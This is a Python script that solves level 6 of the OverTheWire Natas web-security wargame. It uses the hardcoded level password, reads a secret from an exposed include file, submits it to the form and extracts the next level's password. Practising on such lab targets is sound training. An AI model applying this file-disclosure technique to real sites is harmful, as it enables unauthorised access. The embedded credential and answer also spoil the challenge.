#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level6.py
  Solution for natas level6
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 6
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

def get_secret():
   r = requests.get(host + '/includes/secret.inc', auth=(user, password))
   m = re.search(r'"([A-Za-z0-9]+)"', r.text)
   return m.group().replace('"','').strip()

def get_flag():

    _secret = get_secret()
    session = requests.Session()
    session.auth = (user, password)
    postData = {"secret": _secret, "submit":"Skicka+fr%C3%A5ga"}
    r = session.post(host, data=postData)
    return str([c for c in r.text.split('\n') if 'The password for natas7' in c][0].split('is')[1].split()[0])     

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
